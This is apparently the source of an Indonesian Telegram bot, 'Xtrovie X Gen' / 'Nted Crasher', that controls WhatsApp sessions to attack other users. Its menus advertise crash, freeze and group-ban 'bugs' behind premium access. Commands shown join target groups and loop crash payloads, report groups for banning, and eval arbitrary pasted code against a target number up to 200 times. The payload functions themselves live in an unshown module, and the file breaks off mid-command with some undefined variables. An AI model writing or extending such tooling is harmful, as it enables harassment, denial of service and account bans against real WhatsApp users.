const config = require('./Config.js');
global.Bots = [];

function startBots() {
  if (global.Bots.length) {
    global.Bots.forEach(bot => {
      try { bot.stop(); } catch {}
    });
    global.Bots = [];
  }

  config.Token.forEach((token, index) => {

const {
  default: makeWASocket,
  useSingleFileAuthState,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  proto,
  jidDecode,
  jidEncode,
  areJidsSameUser,
  getContentType,
  Browsers,
  BaileysError
} = require("@whiskeysockets/baileys");

const ownerFile = "./FileData/Own.json";
const BvGFile = "./FileData/Prem.json";
const FileSession = "./Dist/active.json";

const { 
 LocX,
 nullViS,
 LocaLog,
 BugV4,
 ChatChat1,
 ChatChat2,
 xofm,
 chatlock,
 FreezeChat,
 invisOOM,
 annotationz,
 OfmSqL,
 ofmEr,
 GroupBug,
 GroupBug2,
 iozk,
 groupBan,
 WaConnect,
 SaveSession,
 sessions,
 sock
} = require("./Dist/Ruang/chache.js");

const {
 isAdmin,
 runtime,
 toRupiah,
 getTime,
 formatNumber,
 pickRandom,
 sleep,
 randomID,
} = require("./Dist/Ruang/myfunc.js");

const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const FormData = require("form-data");
const fetch = require("node-fetch");
const cheerio = require("cheerio");
const util = require("util");
const moment = require('moment-timezone');
const pino = require('pino');
const chalk = require('chalk');
const crypto = require('crypto');
const os = require("os");
const { fromBuffer } = require("file-type")
const readline = require("readline");
const JsConfuser = require('js-confuser');
const https  = require("https");
const { parse } = require("acorn");
const { execSync } = require("child_process");
const prettier = require('prettier');
const { ESLint } = require('eslint');

process.on('uncaughtException', function (err) {
    let e = String(err)
    if (e.includes("conflict")) return
    if (e.includes("Cannot derive from empty media key")) return
    if (e.includes("Socket connection timeout")) return
    if (e.includes("not-authorized")) return
    if (e.includes("already-exists")) return
    if (e.includes("rate-overlimit")) return
    if (e.includes("Connection Closed")) return
    if (e.includes("Timed Out")) return
    if (e.includes("Value not found")) return
    console.error(chalk.red.bold(`
~ [ Xtrovie X Gen Anti Crash ] ~
❌ Uncaught Exception:
${err.message}
`));
  console.error(err.stack);
})

process.on("unhandledRejection", (reason, promise) => {
  console.error(chalk.red.bold(`
~ [ Xtrovie X Gen Anti Crash ] ~
❌ Unhandled Rejection:
${reason}
`));
});

const ownerId = config.Owner[index];
const bot = new Telegraf(token);
const memory = {};
const uploadCache = {}; 
const bots = {};
const userSessions = {};

//---------------( Bagian Akses )
function GetPotoRandom() {
  const Poto = [
    "https://files.catbox.moe/splylc.jpg",
    "https://files.catbox.moe/jtebzr.jpg",
    "https://files.catbox.moe/o30ri9.jpg",
    "https://files.catbox.moe/d60r3b.jpg",
    "https://files.catbox.moe/ywa01e.jpg"
  ];

  return Poto[Math.floor(Math.random() * Poto.length)];
}
const ImgUrl = GetPotoRandom();

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return {};
  try {
    const data = fs.readFileSync(file, "utf8");
    return JSON.parse(data);
  } catch (err) {
    console.error("Error parsing JSON:", err);
    return {};
  }
};

const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error("Error saving JSON:", err);
  }
};
const ownerUsers = loadJSON(ownerFile);
const murbugUser = loadJSON(BvGFile);
let uptime = process.uptime();
const processing = new Set(); 

const isOwner = (ctx) => ownerUsers.includes(ctx.from.id.toString());

const OwnerCheck = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
Kamu tidak bisa memakai command ini, karna kamu tidak memiliki acces untuk command ini, silahkan lah minta add ke yang menjalankan script ini.
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/ryszox" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/ryszox_host" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/Zasta_Team" }]
        ]
      }
    });
  }
  return next();
};
const MurbugCheck = (ctx, next) => {
    if (!murbugUser.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
Kamu tidak bisa memakai command ini, karna kamu tidak memiliki acces untuk command ini, silahkan lah minta add ke yang menjalankan script ini.
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/ryszox" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/ryszox_host" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/Zasta_Team" }]
        ]
      }
    });
    }
    next();
};

function loadPremiumGroups() {
  try {
    const data = fs.readFileSync("FileData/Group.json");
    return JSON.parse(data).groups.map(id => Number(id));
  } catch (err) {
    return [];
  }
}

function savePremiumGroups(groups) {
  fs.writeFileSync("FileData/Group.json",
    JSON.stringify({ groups: groups.map(id => Number(id)) }, null, 2)
  );
}

function loadPremiumUsers() {
  try {
    const data = fs.readFileSync("FileData/User.json");
    return JSON.parse(data).users.map(id => id.toString());
  } catch (err) {
    return [];
  }
}

function savePremiumUsers(users) {
  fs.writeFileSync("FileData/User.json",
    JSON.stringify({ users: users.map(id => id.toString()) }, null, 2)
  );
}

const AccessCheck = (ctx, next) => {
  const groups = loadPremiumGroups();
  const users = loadPremiumUsers();
  const chatId = Number(ctx.chat.id);
  const userId = ctx.from.id.toString();

  if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
    if (groups.includes(chatId)) {
      return next();
    } else {
      return ctx.replyWithPhoto(ImgUrl, {
        caption: `
<blockquote>
❌ Grup ini tidak memiliki akses premium.
Silahkan minta add ke owner script ini.
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜ Owner ⌟", url: "https://t.me/ryszox" }],
            [
              { text: "⌜ Channel ⌟", url: "https://t.me/ryszox_host" },
              { text: "⌜ Group Chat ⌟", url: "https://t.me/Zasta_Team" }
            ]
          ]
        }
      });
    }
  }

  if (ctx.chat.type === "private") {
    if (users.includes(userId)) {
      return next();
    } else {
      return ctx.replyWithPhoto(ImgUrl, {
        caption: `
<blockquote>
❌ Kamu tidak memiliki akses premium.
Silahkan minta add ke owner script ini.
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜ Owner ⌟", url: "https://t.me/ryszox" }],
            [
              { text: "⌜ Channel ⌟", url: "https://t.me/ryszox_host" },
              { text: "⌜ Group Chat ⌟", url: "https://t.me/Zasta_Team" }
            ]
          ]
        }
      });
    }
  }
};
//---------------( Bagian Other )
const weatherEmoji = (condition) => {
  if (!condition || typeof condition !== 'string') return '🌤️';
  const text = condition.toLowerCase();
  if (text.includes('hujan')) return '🌧️';
  if (text.includes('cerah')) return '☀️';
  if (text.includes('berawan')) return '☁️';
  if (text.includes('badai')) return '⛈️';
  if (text.includes('kabut')) return '🌫️';
  return '🌤️';
};

const badwords = ["anjing", "babi", "ngentod", "memek", "kontol", "mmq", "pepek", "ktl", "ngtd", "maklu"];

const MenuHTML = `
<tg-collage>
  <img src="https://files.catbox.moe/ywa01e.jpg"/>
</tg-collage>

<table bordered striped>
<tr><th>ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ 🕸</th><th>ᴅᴇᴛᴀɪʟ ʙᴏᴛ 🪐</th></tr>
<tr><td>🕷 ʙᴏᴛ ɴᴀᴍᴇ</td><td>𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧</td></tr>
<tr><td>☎️ ᴏᴡɴᴇʀ</td><td>@ryszox</td></tr>
<tr><td>🦚 ᴠᴇʀsɪᴏɴ</td><td>✦ 𝐗-𝐆𝐄𝐍 ✦</td></tr>
</table>

<details>
<summary><h2>List Menu Xtrovie 🕷</h2></summary>
<ul>
  <li>Control Menu 🚨</li>
  <li>Bug Menu 🦠</li>
  <li>Main Menu 🔮</li>
  <li>Group Menu 🪅</li>
</ul>
</details>
<footer>© verified by <a href="https://t.me/ryszox">ryszox.t.me</a></footer>
`.trim();
//---------------( Bagian Command )
const activeIntervals = new Map();
bot.command("start", async (ctx) => {
const userId = ctx.chat.id;
let styleIndex = 0;

const initialKeyboard = [
   [{ text: "⌜ ᴏᴘᴇɴ ᴍᴇɴᴜ ⌟", callback_data: "/menu", style: "danger" }],
   [{ text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", url: "https://t.me/TceSupportID", style: "primary"}]
];
 
try {
const response = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
 chat_id: userId,
  rich_message: {
   html: MenuHTML
  },
  reply_markup: {
   inline_keyboard: initialKeyboard }
});
} catch (error) {
 console.error("❌ Gagal mengirim Rich Message Ber-thumbnail:", error.response?.data || error.message);
    ctx.reply("Menu gagal di buka");
  }
});
bot.action('/back', async (ctx) => {
await ctx.answerCbQuery("Kembali ke menu awal")
const Thumbnail = "https://files.catbox.moe/ywa01e.jpg";
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `
<blockquote>
─( 🍻 ) - 你好 ${name}, 私はあなたのアシスタントボットです。何か役に立つことに使ってください、𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 ─ 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩

╭━━━⊱「 𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧  」
║◇ Owner: @ryszox_zasta
┃◇ Version: 𝐗-𝐆𝐄𝐍 
║◇ Runtime: ${runtime(uptime)}
│
┃◇ Name: ${name}
║◇ UserId: ${userId}
┃◇ Acces: ${murbugUser ? "Premium" : "No Access"}
│
│<i>© ⍴᥆ᥕᥱrᥱძ ᑲᥡ 𝐍𝐭𝐞𝐝 𝐂𝐫𝐚𝐬𝐡𝐞𝐫</i>
╰━━━━━━━━━━━━━━━━━⊱
</blockquote>
`;

    const keyboard = [
        [
          {
            text: "⌜ ᴏᴘᴇɴ ᴍᴇɴᴜ ⌟", 
            callback_data: "/menu", 
            style: "danger"
          },
        ],
        [
           {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "primary"
           }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/menu', async (ctx) => {
const Thumbnail = "https://files.catbox.moe/ywa01e.jpg";
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `
<blockquote>
─( 🍻 ) - 你好 ${name}, 私はあなたのアシスタントボットです。何か役に立つことに使ってください、𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 ─ 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩

╭━━━⊱「 𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧  」
║◇ Owner: @ryszox_zasta
┃◇ Version: 𝐗-𝐆𝐄𝐍 
║◇ Runtime: ${runtime(uptime)}
│
┃◇ Name: ${name}
║◇ UserId: ${userId}
┃◇ Acces: ${murbugUser ? "Premium" : "No Access"}
│
│<i>© ⍴᥆ᥕᥱrᥱძ ᑲᥡ 𝐍𝐭𝐞𝐝 𝐂𝐫𝐚𝐬𝐡𝐞𝐫</i>
╰━━━━━━━━━━━━━━━━━⊱
</blockquote>
`;
    const keyboard = [
        [
          {
            text: "◁",
            callback_data: "/control", 
            style: "success"
          },
          {
            text: "▷",
            callback_data: "/bugname", 
            style: "success"
          }
        ],
        [
          {
            text: "II",
            callback_data: "/back", 
            style: "primary"
          }
        ],
        [
          {
            text: "◁",
            callback_data: "/mainname", 
            style: "danger"
          },
          {
            text: "▷",
            callback_data: "/groups", 
            style: "danger"
          }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/control', async (ctx) => {
await ctx.answerCbQuery("membuka menu control ⚙")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `\`\`\`js
const BotINFO = {
 Name: "𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧"
 Owner: "@ryszox"
 Version: "𝐒𝐢𝐱 𝐗 𝐆𝐞𝐧"
 Uptime: "${runtime(uptime)}"
}

const ControlsMenu = {
 addno: "Add Number"
 delno: "Del Number"
 listno: "Daftar Number"
 
 //→ Add Menu
 addgb: "Add Group"
 addown: "Akses Owner"
 addprem: "Akses Premium"
 addbug: "Akses Murbug"

 //→ Delete Menu
 delgb: "Add Group"
 delown: "Akses Owner"
 delprem: "Akses Premium"
 delbug: "Akses Murbug"
}
\`\`\``;

    const keyboard = [
        [
          {
            text: "◁",
            callback_data: "/control", 
            style: "success"
          },
          {
            text: "▷",
            callback_data: "/bugname", 
            style: "success"
          }
        ],
        [
          {
            text: "II",
            callback_data: "/back", 
            style: "primary"
          }
        ],
        [
          {
            text: "◁",
            callback_data: "/mainname", 
            style: "danger"
          },
          {
            text: "▷",
            callback_data: "/groups", 
            style: "danger"
          }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "Markdown",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/bugname', async (ctx) => {
await ctx.answerCbQuery("membuka bug menu ⚡")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const controlsMenu = `\`\`\`js
const BotINFO = {
 Name: "𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧"
 Owner: "@ryszox"
 Version: "𝐒𝐢𝐱 𝐗 𝐆𝐞𝐧"
 Uptime: "${runtime(uptime)}"
}

const BugsMenu = {
 //→ AccesOwner
 trash: "Crash VisibleX"
 xios: "Freeze Ios Frame"
 bangb: "Banned Group"
 testfunc: "Testing Function"
 
 //→ GroupBugs
 trashgb: "Crash No Click"
 ctm: "Crash Slowed"
 
 //→ AccesMurbug
 xlay: "Delay Invisible Slow"
 xui: "Freeze Chat"
 sql: "Delay Bebas Spam"
}
\`\`\``;

    const keyboard = [
        [
          {
            text: "🍬 Back",
            callback_data: "/menu", 
            style: "success"
          },
          {
            text: "🩸 Next",
            callback_data: "/custombug", 
            style: "success"
          }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/custombug', async (ctx) => {
await ctx.answerCbQuery("membuka bug Custom 🚨")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const controlsMenu = `\`\`\`js
const BotINFO = {
 Name: "𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧"
 Owner: "@ryszox"
 Version: "𝐒𝐢𝐱 𝐗 𝐆𝐞𝐧"
 Uptime: "${runtime(uptime)}"
}

const CustomBugs = {
 //→ BugsPrivate
 exp: "Bugs Freeze",
}

Note: Please use in private chat, don't group 
\`\`\``;

    const keyboard = [
        [
          {
            text: "◁",
            callback_data: "/control", 
            style: "success"
          },
          {
            text: "▷",
            callback_data: "/bugname", 
            style: "success"
          }
        ],
        [
          {
            text: "II",
            callback_data: "/back", 
            style: "primary"
          }
        ],
        [
          {
            text: "◁",
            callback_data: "/mainname", 
            style: "danger"
          },
          {
            text: "▷",
            callback_data: "/groups", 
            style: "danger"
          }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/mainname', async (ctx) => {
await ctx.answerCbQuery("Membuka menu main 🎮")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const tqtoMenu = `\`\`\`js
const BotINFO = {
 Name: "𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧"
 Owner: "@ryszox"
 Version: "𝐒𝐢𝐱 𝐗 𝐆𝐞𝐧"
 Uptime: "${runtime(uptime)}"
}

const MainName = {
 //→ ToolsMenu
 cekid: "Cek Id Acc"
 cekidch: "Cek Id Ch WA"
 ping: "Stats Bot"
 play: "Sound Music"
 cekerror: "Cek Eror Code"
 fixerror: "Fixed Code"
 cuaca: "Cek Cuaca Kota"
  
 //→ ConvertMenu
 qc: "Sticker Text"
 iqc: "Iphone Quoted"
 tourl: "Convert Link"
 clogo: "Create Logo"

//→ DownloaderMenu
 ig: "Reels Downloader"
 tiktok: "Tiktok Video"
 spotify: "Play Music"
 ytshorts: "Search VidYT"
}
\`\`\``;

    const keyboard = [
        [
          {
            text: "◁",
            callback_data: "/control", 
            style: "success"
          },
          {
            text: "▷",
            callback_data: "/bugname", 
            style: "success"
          }
        ],
        [
          {
            text: "II",
            callback_data: "/back", 
            style: "primary"
          }
        ],
        [
          {
            text: "◁",
            callback_data: "/mainname", 
            style: "danger"
          },
          {
            text: "▷",
            callback_data: "/groups", 
            style: "danger"
          }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/groups', async (ctx) => {
await ctx.answerCbQuery("Membuka menu Group ⚡")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const tqtoMenu = `\`\`\`js
const BotINFO = {
 Name: "𝐗𝐭𝐫𝐨𝐯𝐢𝐞 𝐗 𝐆𝐞𝐧"
 Owner: "@ryszox"
 Version: "𝐒𝐢𝐱 𝐗 𝐆𝐞𝐧"
 Uptime: "${runtime(uptime)}"
}

const GroupMenu = {
 mute: "Mute User"
 unmute: "Unmute User"
 ban: "Banned User"
 unban: "Unban User"
 promote: "Promote User"
 demote: "Demote User"
 antilink: "Delete Link"
 antitoxic: "Delete Toxic"
 ping: "Stats Bot"
}
\`\`\``;

    const keyboard = [
        [
          {
            text: "◁",
            callback_data: "/control", 
            style: "success"
          },
          {
            text: "▷",
            callback_data: "/bugname", 
            style: "success"
          }
        ],
        [
          {
            text: "II",
            callback_data: "/back", 
            style: "primary"
          }
        ],
        [
          {
            text: "◁",
            callback_data: "/mainname", 
            style: "danger"
          },
          {
            text: "▷",
            callback_data: "/groups", 
            style: "danger"
          }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//##############################
bot.command("cekidch", AccessCheck, async (ctx) => {
  if (!global.sock || !global.sock.newsletterMetadata) {
    return ctx.reply("⚠️ WhatsApp belum terhubung. Jalankan /pairing dulu.");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukin Link Channel");
  if (!text.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("Link tautan tidak valid.");
  }

  try {
    const inviteCode = text.split("https://whatsapp.com/channel/")[1].trim();
    const res = await global.sock.newsletterMetadata("invite", inviteCode);

    const id = res.id;
    await ctx.reply("⌜ Xtrovie X Gen Bot ⌟\n", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄᴏᴘʏ ɪᴅ", copy_text: { text: id } }]
        ]
      }
    });
  } catch (e) {
    console.error(e);
    ctx.reply("Gagal mengambil data channel.");
  }
});
bot.command("testfunc", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const text = args.join(" ");

  if (sessions.size === 0) 
    return ctx.reply("❌ 🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number]");

  if (!text) {
    return ctx.reply(`Example: /testfunc 62xxx|5`, { parse_mode: "Markdown" });
  }

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply("*Reply pesan berisi function!*", { parse_mode: "Markdown" });
  }

  let [num, cnt] = text.split("|");
  let target = num.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let count = parseInt(cnt) || 1;
  if (count > 200) count = 200;

  let funcCode = ctx.message.reply_to_message.text;

  try {
    eval(funcCode);

    let funcName = funcCode.match(/function\s+([a-zA-Z0-9_]+)/)?.[1];
    if (!funcName) {
      return ctx.reply("Function tidak valid");
    }

    for (let i = 0; i < count; i++) {
      await eval(`${funcName}("${target}")`);
      console.log(chalk.green(`Success ${i + 1}`));
    }

    const caption = `
<blockquote>─( 𖢗 ) 𝐍𝐭𝐞𝐝 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐁𝐎𝐓
🔮 𝗍ᥲrgᥱ𝗍: <code>${target}</code>
🧬 ᥣ᥆᥆⍴: ${count}x

Silahkan tunggu proses 🚀
</blockquote>
`;
  
  await ctx.replyWithVideo({ 
   url: "https://files.catbox.moe/k50pqs.mp4"
  },
  {
    caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "☏ Cek Target", url: `https://wa.me/${target.split("@")[0]}` }
        ]
      ]
    }
  }
);
  } catch (e) {
    ctx.reply(`ERROR ❌\n${e.message}`);
  }
});
bot.command("bangb", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 120363025843999999@g.us</code>`,
        parse_mode: "HTML"
      }
    );
  }
  
  const rawTarget = kkk;

  if (!/^[0-9]+@g\.us$/.test(rawTarget)) {
  return ctx.reply(
    `❌ ID Grup tidak valid\nContoh:\n<code>${cmd} 120363025843999999@g.us</code>`,
    { parse_mode: "HTML" }
  );
}
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@g.us";

  try {
    await groupBan(target);

    await ctx.telegram.editMessageMedia(ctx.chat.id, ctx.message.message_id, null, {
      type: "photo",
      media: "https://files.catbox.moe/dcnz2q.jpg",
        caption: `<blockquote>─ 🕷 Successfully added bot
╔━═━═━═━══━═━═━═〢
│target: <code>${target}</code>
╚━═━═━═━══━═━═━═〢
</blockquote>`,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: [[
            { text: "Targer", url: `https://wa.me/${target.replace("@g.us","")}`, style: "success" }]
          ]
        }
      }
     );
   } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageMedia(
      ctx.chat.id,
      ctx.message.message_id,
      null,
      {
        type: "photo",
        media: "https://files.catbox.moe/dcnz2q.jpg",
        caption: `⚠️ Gagal menambahkan nomor ke grup:\n<code>${target}</code>`,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Channel", url: "https://t.me/ryszox_host", style: "danger" }]
          ]
        }
      }
    );
  }
});
bot.command("trashgb", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} https://chat.whatsapp.com/abc123xyz</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const inviteCode = kkk.includes("chat.whatsapp.com") ? kkk.split("/").pop() : kkk;
  if (!inviteCode || inviteCode.length < 5) {
    return ctx.reply(
      `❌ Kode invite tidak valid\nContoh:\n<code>${cmd} https://chat.whatsapp.com/abc123xyz</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = await sock.groupAcceptInvite(inviteCode);
    
    if (!target) {
      return ctx.reply("❌ Gagal join grup. Cek kembali kode invite.");
    }

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 90; n++) {
        await GroupBug(target);
        await GroupBug2(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/90`));
      }

      await sock.groupLeave(target);
      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("ctm", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} https://chat.whatsapp.com/abc123xyz</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const inviteCode = kkk.includes("chat.whatsapp.com") ? kkk.split("/").pop() : kkk;
  if (!inviteCode || inviteCode.length < 5) {
    return ctx.reply(
      `❌ Kode invite tidak valid\nContoh:\n<code>${cmd} https://chat.whatsapp.com/abc123xyz</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = await sock.groupAcceptInvite(inviteCode);
    
    if (!groupId) {
      return ctx.reply("❌ Gagal join grup. Cek kembali kode invite.");
    }

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 90; n++) {
        await GroupBug2(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/90`));
      }

      await sock.groupLeave(target);
      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
